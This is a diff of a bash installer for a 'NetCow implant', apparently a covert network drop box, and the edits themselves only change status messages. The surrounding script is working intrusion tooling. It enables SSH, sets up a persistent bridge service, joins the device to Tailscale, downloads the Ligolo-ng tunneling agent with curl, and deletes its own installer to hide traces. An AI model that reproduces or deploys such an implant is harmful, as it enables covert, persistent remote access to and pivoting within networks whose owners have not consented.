@@ -8,15 +8,15 @@ echo "[+] Deploying NetCow implant..."
 REQUIRED_PKGS=(bridge-utils ifupdown isc-dhcp-client tailscale curl tar openssh-server)
 for pkg in "${REQUIRED_PKGS[@]}"; do
     if ! dpkg -s "$pkg" >/dev/null 2>&1; then
-        echo "    [-] $pkg missing, installing..."
+        echo "    [o] $pkg missing, installing..."
         apt-get update && apt-get install -y "$pkg"
     else
-        echo "    [+] $pkg already installed"
+        echo "    [✓] $pkg already installed"
     fi
 done
 
 # 2. Enable SSH service
-echo "[+] Enabling SSH service..."
+echo
 systemctl enable ssh
 systemctl start ssh
 echo "[✓] SSH is now active."
@@ -70,7 +70,8 @@ dhclient -1 br0
 EOF
 
 chmod +x /usr/local/sbin/setup_bridge.sh
-echo "[+] setup_bridge.sh created."
+echo
+echo "[✓] setup_bridge.sh created."
 
 # 5. Create systemd service for setup_bridge
 cat << 'EOF' > /etc/systemd/system/setup-bridge.service
@@ -87,12 +88,11 @@ RemainAfterExit=yes
 [Install]
 WantedBy=multi-user.target
 EOF
-
-echo "[+] Systemd service setup-bridge.service created."
+echo
+echo "[✓] Systemd service setup-bridge.service created."
 
 # 6. Configure NetworkManager to ignore eth0/eth1
 NM_CONF="/etc/NetworkManager/NetworkManager.conf"
-echo "[+] Configuring NetworkManager to ignore eth0/eth1..."
 if ! grep -q "\[keyfile\]" "$NM_CONF"; then
     echo -e "\n[keyfile]" >> "$NM_CONF"
 fi
@@ -103,6 +103,7 @@ else
 fi
 
 systemctl restart NetworkManager
+echo
 echo "[✓] NetworkManager restarted."
 
 # 7. Enable bridge service at boot
@@ -112,10 +113,11 @@ systemctl enable setup-bridge.service
 # 8. Enable and start Tailscale
 systemctl enable tailscaled
 systemctl start tailscaled
+echo
 echo "[✓] Tailscale ready to use."
 
 # 9. Download and extract Ligolo-ng agent
-echo "[+] Downloading Ligolo-ng agent..."
+echo "[+] Downloading Ligolo-ng agent."
 mkdir -p /opt/ligolo
 curl -sSL https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_agent_0.8_linux_arm64.tar.gz -o /opt/ligolo/ligolo-agent.tar.gz
 tar -xvzf /opt/ligolo/ligolo-agent.tar.gz -C /opt/ligolo/
@@ -128,12 +130,14 @@ echo "[✓] Ligolo-ng agent ready to use as 'ligolo'"
 
 # 10. Self-delete installer
 INSTALLER_PATH=$(readlink -f "$0")
-echo "[+] Deleting installer script: $INSTALLER_PATH"
+echo
+echo "[✓] Deleting installer script: $INSTALLER_PATH"
 rm -f "$INSTALLER_PATH"
 
 # Final messages
 echo
 echo "[✓] NetCowImplant - Installation complete!"
+echo
 echo "[!] To finish setup:"
 echo "    1. Run: sudo tailscale up --authkey tskey-xxxxxxxxxxxxxxxx"
 echo "    2. Reboot: sudo reboot"
